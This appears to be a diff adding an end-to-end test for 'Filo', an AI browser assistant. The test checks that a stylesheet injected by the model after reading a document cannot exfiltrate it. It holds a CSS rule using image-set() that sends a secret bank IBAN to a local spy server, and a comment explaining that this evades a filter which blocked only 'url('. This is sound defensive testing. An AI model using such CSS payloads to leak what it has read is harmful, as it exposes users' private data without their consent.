@@ -11,6 +11,7 @@
 // l'utente lo vede e dice di sì.
 
 import { writeFileSync } from 'node:fs';
+import { createServer } from 'node:http';
 import { join } from 'node:path';
 import { test, expect } from './fixtures/electron.mjs';
 import { caricaMarkdown } from './helpers/collegamentoFilo.mjs';
@@ -264,4 +265,73 @@ test('dopo una lettura, una pagina che si apre col tuo dato nell\'indirizzo la l
   });
   expect(schede.some((u) => u.includes('IT60X0542811101000000123456')),
     'la scheda si è aperta davvero sull\'indirizzo che porta fuori il dato').toBe(false);
+});
+
+// #533 (decimo giro di verifica) — la terza strada: l'aspetto. Filo cambia
+// l'aspetto della pagina iniettandoci un foglio di stile scritto dal modello.
+// Il divieto di andare in rete era scritto sulla PAROLA `url(`, e la stessa
+// cosa scritta `image-set("https://…")` passava intera: dopo una lettura il
+// foglio di stile portava fuori il documento dell'utente, senza un clic e
+// senza una conferma. La regola sta in tests/unit/pageRestyle.test.mjs; qui si
+// guarda il risultato per l'utente, cioè che nessuno bussi a quel server.
+test('dopo una lettura, il foglio di stile che Filo mette nella pagina non va a prendere niente in rete', async ({ app, openTab, testServer }) => {
+  test.setTimeout(90_000);
+  await configura(app);
+
+  const visti = [];
+  const spia = createServer((req, res) => {
+    visti.push(String(req.url || ''));
+    res.writeHead(200, { 'Content-Type': 'image/png' });
+    res.end('');
+  });
+  await new Promise((r) => spia.listen(0, '127.0.0.1', r));
+  const fuori = `http://127.0.0.1:${spia.address().port}`;
+
+  const web = await openTab(testServer.html('<h1>Notizie</h1><p>testo</p>'));
+  await web.waitForLoadState('domcontentloaded');
+  const page = await openTab(NEWTAB);
+  await expect(page.locator('#input')).toBeVisible({ timeout: 15_000 });
+
+  const documento = documentoConSegreto();
+  await copione(app, {
+    giri: [
+      [{ name: 'DICHIARA_USCITE', args: { uscite: ['aspetto'] } }],
+      [{ name: 'LEGGI_DOCUMENTO', args: { percorso: documento } }],
+      [{
+        name: 'STILE_PAGINA',
+        args: {
+          descrizione: 'testo più grande',
+          regole: [
+            { selettore: 'p', css: 'font-size: 20px' },
+            { selettore: 'body', css: `background-image: image-set("${fuori}/raccolta?d=${encodeURIComponent(SEGRETO)}" 1x)` },
+          ],
+        },
+      }],
+      [],
+    ],
+    risposta: 'Fatto: ho ingrandito il testo.',
+  });
+
+  const azioni = await page.evaluate(async () => {
+    const res = await chrome.runtime.sendMessage({
+      type: window.SN_MSG.MSG.FILO_CHAT,
+      userMessage: 'Leggimi l\'estratto conto e intanto ingrandisci il testo di questa pagina.',
+      threadHistory: [],
+    });
+    return (res && res.actions) || [];
+  });
+  await ripristina(app);
+  expect(azioni.some((a) => String(a.type).toUpperCase() === 'STILE_PAGINA')).toBe(true);
+
+  await new Promise((r) => setTimeout(r, 2500));
+  const bussate = visti.join(' ');
+  try { spia.closeAllConnections?.(); } catch (_) {}
+  await new Promise((r) => spia.close(r));
+
+  expect(bussate, 'il foglio di stile è andato a prendere un\'immagine a un indirizzo che si porta dietro il documento appena letto')
+    .not.toContain('IT60X0542811101000000123456');
+  // La regola legittima dello stesso turno è passata: si scarta la riga storta,
+  // non tutta la richiesta.
+  const stile = await web.evaluate(() => getComputedStyle(document.querySelector('p')).fontSize);
+  expect(stile).toBe('20px');
 });
